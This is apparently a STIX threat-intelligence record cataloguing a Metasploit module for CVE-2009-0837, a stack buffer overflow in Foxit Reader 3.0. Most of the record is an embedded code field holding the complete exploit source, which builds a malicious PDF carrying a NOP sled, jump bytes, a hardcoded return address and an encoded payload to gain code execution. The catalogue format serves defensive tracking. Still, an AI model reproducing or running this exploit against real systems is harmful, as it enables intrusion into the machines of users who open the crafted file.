{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5ce43776-c079-43f8-9361-80530b0a4e2f",
    "created": "2024-08-14T16:37:00.322448Z",
    "modified": "2024-08-14T16:37:00.322452Z",
    "name": "Foxit Reader 3.0 Open Execute Action Stack Based Buffer Overflow",
    "description": " This module exploits a buffer overflow in Foxit Reader 3.0 builds 1301 and earlier. Due to the way Foxit Reader handles the input from an \"Launch\" action, it is possible to cause a stack-based buffer overflow, allowing an attacker to gain arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/foxit_reader_launch.rb",
            "external_id": "foxit_reader_launch.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0837"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/foxit-reader-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Foxit Reader 3.0 Open Execute Action Stack Based Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow in Foxit Reader 3.0 builds 1301 and earlier.\n        Due to the way Foxit Reader handles the input from an \"Launch\" action, it is possible\n        to cause a stack-based buffer overflow, allowing an attacker to gain arbitrary code\n        execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Francisco Falcon',  # Discovery\n          'bannedit'           # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE' , '2009-0837' ],\n          [ 'OSVDB', '55614' ],\n          [ 'BID', '34035'],\n          [ 'URL', 'http://www.coresecurity.com/content/foxit-reader-vulnerabilities']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0d\\x22\\x28\\x29\\x2F\\x5c\\x3c\\x3e\\x5e\\x7e\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Foxit Reader 3.0 Windows XP SP2', { 'Ret' =>  0x74d34d3f} ], # ebp + offset\n        ],\n      'DisclosureDate' => '2009-03-09',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n    ])\n\n  end\n\n  def exploit\n    pdf = make_pdf\n    file_create(pdf)\n    handler\n  end\n\n  def make_pdf\n    action = \"\\n<</Type/Action/S/Launch/F<</F(/C/\" # Open Execute Action\n    action << make_nops(321 - 5)                   # make_nops(21)\n    action << payload.encoded\n    action << \"\\xe9\\xe8\\xfb\\xff\\xff\"               # Jmp back to the NOPs before the payload\n    action << \"\\xeb\\xf9\" + make_nops(2)            # Jmp to the near jump\n    action << [target.ret].pack('V')\n    action << \"\\x92\" * 16\n    action << \")>>/NewWindow true>>\"\n\n    pdf =  \"%PDF-1.4\\n\"\n    pdf << \"1 0 obj\\n\"\n    pdf << \"<</Type/Page/Parent 4 0 R /Resources 6 0 R /MediaBox[ 0 0 000 000]\"\n    pdf << \"/Group<</S/Transparency/CS/DeviceRGB/I true>>/Contents 2 0 R \"\n    pdf << \"/Annots[ 24 0 R  25 0 R  9 0 R ]>>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"4 0 obj\\n\"\n    pdf << \"<</Type/Pages/Resources 6 0 R /MediaBox[ 0 0 000 000]/Kids[ 1 0 R ]/Count 1>>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"7 0 obj\\n\"\n    pdf << \"<</Type/Catalog/Pages 4 0 R /OpenAction[ 1 0 R /XYZ null null 0]/Lang(en-US)/Names 28 0 R >>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"9 0 obj\\n\"\n    pdf << \"<</Type/Annot/Subtype/Screen/P 1 0 R /M(E:000000000000000-00'00')/F 4/Rect[ \"\n    pdf << \"000.000 000.000 000.000 000.000]/BS<</S/S/W 1>>/BE<</S/S>>/MK<</BC[ 0 0 1]\"\n    pdf << \"/R 0/IF<</SW/A/S/A/FB false/A[ 0.5 0.5]>>>>/AP<</N 10 0 R >>/T()/A 12 0 R /AA 17 0 R >>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"16 0 obj\\n\"\n    pdf << action\n    pdf << \"endobj\\n\"\n    pdf << \"17 0 obj\\n\"\n    pdf << \"<</PV 16 0 R >>\\n\"\n    pdf << \"endobj\\n\"\n    pdf << \"trailer\\n\"\n    pdf << \"<</Root 7 0 R /Info 8 0 R /ID[<00000000000000000000000000000000><00000000000000000000000000000000>]\"\n    pdf << \"/DocChecksum/00000000000000000000000000000000/Size 31>>\\n\"\n    pdf << \"startxref\\n\"\n    pdf << \"0000\\n\"\n    pdf << \"%%EOF\\n\"\n    pdf\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-09",
    "x_mitre_platforms": [
        "win'"
    ]
}